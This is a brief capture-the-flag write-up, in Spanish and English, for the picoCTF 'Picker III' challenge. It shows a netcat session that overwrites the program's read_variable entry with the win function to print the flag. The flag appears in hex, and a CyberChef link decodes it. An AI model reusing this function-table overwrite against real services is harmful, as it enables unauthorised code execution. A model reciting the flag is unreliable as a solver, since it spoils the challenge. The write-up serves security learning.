#### Descripción 
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 50173`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/526/picker-III.py).
#### Solución
 ```
 ==> reset

==> 1

1: print_table

2: read_variable

3: write_variable

4: getRandomNumber

==> 4

4

==> 3

Please enter variable name to write: win

Please enter new value of variable: 2

==> 3       

Please enter variable name to write: read_variable

Please enter new value of variable: win

==> 2

rosyperez@MacBookAir PickerIII % nc saturn.picoctf.net 50173

==> 3

Please enter variable name to write: read_variable

Please enter new value of variable: win

==> 2

0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d 

==>
 ```
#### Notas
Se trata de utilizar el sistema y entender el código, este en particular se me dificultó bastante se trata de guardar el nombre de la función y el parametro que se le pasa a la misma para ejecutarlas con read_variable 
#### Referencias
https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=MHg3MCAweDY5IDB4NjMgMHg2ZiAweDQzIDB4NTQgMHg0NiAweDdiIDB4MzcgMHg2OCAweDMxIDB4MzUgMHg1ZiAweDMxIDB4MzUgMHg1ZiAweDc3IDB4NjggMHgzNCAweDM3IDB4NWYgMHg3NyAweDMzIDB4NWYgMHg2NyAweDMzIDB4MzcgMHg1ZiAweDc3IDB4MzEgMHgzNyAweDY4IDB4NWYgMHg3NSAweDM1IDB4MzMgMHg3MiAweDM1IDB4NWYgMHgzMSAweDZlIDB4NWYgMHg2MyAweDY4IDB4MzQgMHg3MiAweDY3IDB4MzMgMHg1ZiAweDMyIDB4MzIgMHgzNiAweDY0IDB4NjQgMHgzMiAweDM4IDB4MzUgMHg3ZCA